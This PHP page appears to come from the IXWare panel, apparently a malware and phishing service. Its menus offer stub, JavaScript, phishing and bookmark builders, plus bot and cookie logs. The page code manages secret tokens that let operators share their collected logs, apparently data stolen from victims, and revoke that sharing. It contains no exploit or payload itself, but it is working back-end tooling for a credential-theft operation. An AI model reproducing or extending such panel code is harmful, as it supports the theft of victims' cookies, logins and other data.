<?php 
      @session_start();
      $title = 'Builder Settings';
      include_once 'includes/layout/header.php';
      include_once 'includes/checks.php';
      include_once __DIR__.'/../vendor/autoload.php';
      
      $getRank = pdoQuery($db, "SELECT `rank` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn();
      $activated = pdoQuery($db, "SELECT `expireActivate` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn();
      $banned = pdoQuery($db, "SELECT `banned` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn(0);
      
      if($banned != 0){
          
          header("location: support");
          exit();
      }
      if(checkMaintenance() == 'Maintenance' && $getRank != "Admin"){
          header('Location: dashboard');
          die();
      }
      if (isset($_GET["id"])){
        $IDerror = "Please update your discord ID!";
      }

      if(isset($_SESSION['username'])){
        $username = htmlspecialchars($_SESSION['username']);
      }else{
        $username = "Unknown";
      }
       
?>

<?php

if (isset($_POST['updateToken'])){

      if(!empty($_POST['secretToken'])){

        if (\Volnix\CSRF\CSRF::validate($_POST)) {

          if ($activated == 0){

            $sToken = hash('sha256', str_replace('DO_NOT_SHARE_WITH_STRANGERS_', '', htmlspecialchars($_POST['secretToken'])));
            $getOwner = pdoQuery($db, "SELECT `username` FROM `users` WHERE `secretToken`=?", [$sToken])->fetchColumn();
            //$secretOwnerToken = pdoQuery($db, "SELECT `secretToken` FROM `users` WHERE `username`=?", [$getOwner])->fetchColumn();
    
            if($getOwner != $_SESSION['username']){
    
                if(checkSecretToken($sToken) == 1){
    
                    $PDOS = $db -> prepare('UPDATE `users` SET `usedToken` = :secret WHERE `id` = :id');
                    $PDOS -> execute(array(':secret' => $getOwner, ':id' => htmlspecialchars($_SESSION['ID'])));
              
                    logUser($_SESSION['ID'], $_SESSION['username'], "Used the secret token from $getOwner");
                    $Updatesuccess = "Successfully used the secret token from '$getOwner', you will now see logs from the secret token owner.";
                }else{
                    $Updateerror = "The secret token doesn't exist!";
                }
            }else{
                $Updateerror = "You can't use your own token!";
            }
          }else{
            $Updateerror = "You need to activate your account.";
          }
        }else{
          header("HTTP/1.1 401 Unauthorized");
          echo file_get_contents('includes/layout/error/401.php');
          die();
        }
      }else{
          $Updateerror = "Please enter a secret token";
      }
  }
  if (isset($_POST['generateToken'])){

    if (\Volnix\CSRF\CSRF::validate($_POST)) {

      if ($activated == 0){

        $token = getID(50);
        $hashed = hash('sha256', $token);
    
        $PDOS = $db -> prepare('UPDATE `users` SET `secretToken` = :secret WHERE `id` = :id');
        $PDOS -> execute(array(':secret' => $hashed, ':id' => htmlspecialchars($_SESSION['ID'])));
    
        logUser($_SESSION['ID'], $_SESSION['username'], "Generated a new secret token");
        $Secretsuccess = "Successfully generated a new secret token, the previous generated tokens will become unuseable.";
        $_SESSION['userSecretToken'] = "DO_NOT_SHARE_WITH_STRANGERS_$token";
      }else{
        $Secreterror = "You need to activate your account.";
      }
    }else{
      header("HTTP/1.1 401 Unauthorized");
      echo file_get_contents('includes/layout/error/401.php');
      die();
    }
  }
  if (isset($_POST['hideToken'])){

    if (\Volnix\CSRF\CSRF::validate($_POST)) {

      if ($activated == 0){

        if(isset($_SESSION['userSecretToken'])){

          unset($_SESSION['userSecretToken']);
          $Secretsuccess = "Successfully completely hided your secret token";
        }else{
            $Secreterror = "Error while hiding the secret token, contact an IXWare Developer";
        }
      }else{
        $Secreterror = "You need to activate your account.";
      }
    }else{
      header("HTTP/1.1 401 Unauthorized");
      echo file_get_contents('includes/layout/error/401.php');
      die();
    }
  }
  if (isset($_POST['resetTokens'])){

    if (\Volnix\CSRF\CSRF::validate($_POST)) {

      if ($activated == 0){

        if(checkUsedToken(htmlspecialchars($_SESSION['username'])) != 0){

          $get = pdoQuery($db, "SELECT * FROM `users`");
          $results = $get->fetchAll(PDO::FETCH_ASSOC);
      
          foreach($results as $result){
              $subscription = htmlspecialchars($result['subscription']);
              $usedUser = htmlspecialchars($result['usedToken']);
              $userID = htmlspecialchars($result['id']);
      
              if($usedUser == htmlspecialchars($_SESSION['username'])){
      
                  $PDOUpdate = $db -> prepare('UPDATE `users` SET `usedToken` = :change WHERE `id` = :id');
                  $PDOUpdate -> execute(array(':change' => '0', ':id' => $userID));
    
                  $Secretsuccess = "Successfully removed the access from every user who used your token";
              }
          }
        }else{
          $Secreterror = "No user who used your secret token found";
        }
      }else{
        $Secreterror = "You need to activate your account.";
      }
    }else{
      header("HTTP/1.1 401 Unauthorized");
      echo file_get_contents('includes/layout/error/401.php');
      die();
    }
  }
?>

  <body class="bg-dark">
  <!--Main Navigation-->
  <header>
    <!-- Sidenav -->
    <nav id="sidenav-1" class="sidenav bg-dark" data-hidden="false" data-accordion="true">
      <a class="ripple d-flex justify-content-center py-4" href="#!" data-ripple-color="primary">
        <img id="IXWARE Logo" src="resources/img/ixwarelogogif.gif" alt="IX Logo" draggable="false" style="width: 170px;" />
      </a>

      <ul class="sidenav-menu">
        <li class="sidenav-item ml-4 mt-2 mb-1 text-white">
          <span>General</span>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link" href="dashboard">
            <i class="fas fa-tachometer-slow fa-fw mr-3"></i><span>Dashboard</span>
          </a>
        </li>       
        <?php
          if ($getRank == "User" || $getRank == "Admin"){
            echo "<li class='sidenav-item'>
            <a class='sidenav-link' href='purchase'>
              <i class='fas fa-shopping-basket fa-fw mr-3'></i><span>Purchase</span>
            </a>
          </li>";
          }
        ?>
        <li class="sidenav-item ml-4 mt-4 mb-1 text-white">
          <span>Managing</span>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link">
            <i class="fas fa-users fa-fw mr-3"></i><span>Bots</span>
          </a>
          <ul class="sidenav-collapse">
            <?php
              if ($getRank == "Premium" || $getRank == "Admin"){
                
                echo "<li class='sidenav-item'>
                 <a class='sidenav-link' href='bots'>Stubs <span class='badge bg-danger ml-2' id='bot-logs'>0</span></a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBots'>Javascript <span class='badge bg-danger ml-2' id='cookie-logs'>0</span></a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='psBots'>Phishing <span class='badge bg-danger ml-2' id='ps-logs'>0</span></a>
                </li>";
              }elseif($getRank == "User"){

                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBots'>Javascript <span class='badge bg-danger ml-2' id='cookie-logs'>0</span></a>
                </li>";
              }
            ?>
          </ul>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link">
            <i class="fas fa-shield-virus fa-fw mr-3"></i><span>Builder</span>
          </a>
          <ul class="sidenav-collapse">
            <?php
              if ($getRank == "Premium" || $getRank == "Admin"){
                
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='builder'>Stub</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBuilder'>Javascript</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='psBuilder'>Phishing</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='bmBuilder'>Bookmark</a>
                </li>";
              }elseif($getRank == "User"){
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBuilder'>Javascript</a>
                </li>";
              }
            ?>
          </ul>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link">
            <i class="fas fa-file-download fa-fw mr-3"></i><span>Builds</span>
          </a>
          <ul class="sidenav-collapse">
            <?php
              if ($getRank == "Premium" || $getRank == "Admin"){
                
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='builds'>Stub</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBuilds'>Javascript</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='psBuilds'>Phishing</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='bmBuilds'>Bookmark</a>
                </li>";
              }elseif($getRank == "User"){
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBuilds'>Javascript</a>
                </li>";
              }
            ?>
          </ul>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link">
            <i class="fas fa-tools fa-fw mr-3"></i><span>Tools</span>
          </a>
          <ul class="sidenav-collapse">
            <li class='sidenav-item'>
              <a class='sidenav-link' href='watchlist'>Watchlist</a>
            </li>
          </ul>
        </li>
        <li class="sidenav-item ml-4 mt-4 mb-1 text-white">
          <span>Account</span>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link">
            <i class="fas fa-sliders-h fa-fw mr-3"></i><span>Settings</span>
          </a>
          <ul class="sidenav-collapse">
            <li class="sidenav-item">
              <a class="sidenav-link" href="settings">General</a>
            </li>
            <li class="sidenav-item">
              <a class="sidenav-link active" href="builder-settings">Builder</a>
             </li>
          </ul>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link" href="ix-licenses">
            <i class="fab fa-keycdn fa-fw mr-3"#></i><span>Licenses</span>
          </a>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link" href="support">
            <i class="fas fa-question-circle fa-fw mr-3"#></i><span>Support</span>
          </a>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link" href="logout">
            <i class="fal fa-sign-out fa-fw mr-3"></i><span>Logout</span>
          </a>
        </li>
      </ul>
    </nav>
    <!-- Sidenav -->

    <!-- Navbar -->
    <nav
      id="main-navbar"
      class="navbar navbar-expand-lg navbar-light fixed-top bg-dark"
    >
      <!-- Container wrapper -->
      <div class="container-fluid">
        <nav aria-label="breadcrumb">
          <ol class="breadcrumb">
            <li class="breadcrumb-item text-white">Builder Settings</li>
          </ol>
        </nav>
        <!-- Toggler -->
        <button
          data-toggle="sidenav"
          data-target="#sidenav-1"
          class="btn shadow-0 p-0 mr-3 d-block d-xxl-none"
          aria-controls="#sidenav-1"
          aria-haspopup="true"
        >
          <i class="fas fa-bars fa-lg"></i>
        </button>

        <!-- Right links -->
        <ul class="navbar-nav ml-auto d-flex flex-row">

          <!-- Icon -->
          <li class="nav-item">
            <a class="nav-link mr-3 mr-lg-0 mt-2 text-white">
              <?= $username ?>
            </a>
          </li>
          <!-- Icon -->
          <li class="nav-item">
            <a class="nav-link mr-3 mr-lg-0 mt-2">
              <?php
                if ($getRank == "User"){
                  echo "<span class='badge bg-light text-dark'>Default</span>";
                }elseif ($getRank == "Admin"){
                  echo "<span class='badge bg-danger'>Administrator</span>";
                }elseif ($getRank == "Premium"){
                  echo "<span class='badge bg-warning text-dark'>Premium</span>";
                }
              ?>
            </a>
          </li>
          <!-- Icon -->
          <li class="nav-item">
            <a class="nav-link mr-3 mr-lg-0">
<?php
		            $getAvatar = pdoQuery($db, "SELECT `avatarURL` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn();
                $av = htmlspecialchars($getAvatar);
                if ($av == '0' || empty($av)){
                  echo "<img src='resources/img/logo.png' class='img-fluid rounded-circle profile-size' alt='' />";
                }else{
                  echo "<img src='$av' class='img-fluid rounded-circle profile-size' alt='' />";
                }
              ?>
            </a>
          </li>
        </ul>
      </div>
      <!-- Container wrapper -->
    </nav>
    <!-- Navbar -->
  </header>
  <!--Main Navigation-->


  <!--Main layout-->
  <main style="margin-top: 100px" class="d-flex ml-5 mr-5">
    <div class="container-fluid">
        <div class="row">
            <div class="col-xl-6">
                <?php
                    if(!empty($Secreterror)){
                        echo '<div class="animated fadeIn">'.error(htmlspecialchars($Secreterror)).'</div>';
                    }
                    if(!empty($Secretsuccess)){
                        echo '<div class="animated fadeIn">'.success(htmlspecialchars($Secretsuccess)).'</div>';
                    }
                ?>
                <form method="POST">
                    <div class="card settings-token-card bg-dark">
                        <div class="card-body d-flex flex-column">
                            <p class="font-weight-bolder text-left text-white">Bot Token</p>
                            <p class="font-weight-lighter text-muted text-lightred">Create a secret token to share your logs with your friends! 'Reset Users' will cause that every user who used your token won't be able to access your logs anymore.</p>
                            <div class="col">
                                <!-- Default input -->
                                <input type="text" class="form-control" name="sToken" placeholder="Secret Token" value="<?php if(!empty($_SESSION['userSecretToken'])){ echo htmlspecialchars($_SESSION['userSecretToken']); } ?>" style="background-color: transparent !important;" disabled>
                            </div>
                            <button type="submit" name="generateToken" value="token" class="btn btn-outline-primary waves-effect mt-auto center-button settings-button" style="width: 100%;">Generate</button>
                            <button type="submit" name="hideToken" class="btn btn-outline-primary waves-effect mt-auto center-button settings-button" style="width: 100%;">Hide Token</button>
                            <button type="submit" name="resetTokens" class="btn btn-outline-primary waves-effect mt-auto center-button settings-button" style="width: 100%;">Reset Users</button>
                            <input type="hidden" name="<?= \Volnix\CSRF\CSRF::TOKEN_NAME ?>" value="<?= \Volnix\CSRF\CSRF::getToken() ?>"/>
                        </div>
                    </div>
                </form>
            </div>
            <div class="col-xl-6">
                <?php
                    if(!empty($Updateerror)){
                        echo '<div class="animated fadeIn">'.error(htmlspecialchars($Updateerror)).'</div>';
                    }
                    if(!empty($Updatesuccess)){
                        echo '<div class="animated fadeIn">'.success(htmlspecialchars($Updatesuccess)).'</div>';
                    }
                ?>
                <form method="POST">
                    <div class="card settings-token-card bg-dark">
                        <div class="card-body d-flex flex-column">
                            <p class="font-weight-bolder text-left text-white">Use Secret Token</p>
                            <p class="font-weight-lighter text-muted text-lightred">You will be able to see logs from the secret-tokens owner</p>
                            <div class="col">
                                <!-- Default input -->
                                <input type="text" class="form-control darkInput" name="secretToken" placeholder="Enter the secret token" autocomplete="off" style="background-color: transparent !important;">
                            </div>
                            <button type="submit" name="updateToken" class="btn btn-outline-primary waves-effect mt-auto center-button settings-button" style="width: 100%;">Validate</button>
                            <input type="hidden" name="<?= \Volnix\CSRF\CSRF::TOKEN_NAME ?>" value="<?= \Volnix\CSRF\CSRF::getToken() ?>"/>
                        </div>
                    </div>
                </form>
            </div>
        </div>
    </div>
  </main>
  <!--Main layout-->


  <?php require_once 'includes/layout/footer.php'; require_once 'includes/realtime.php';?>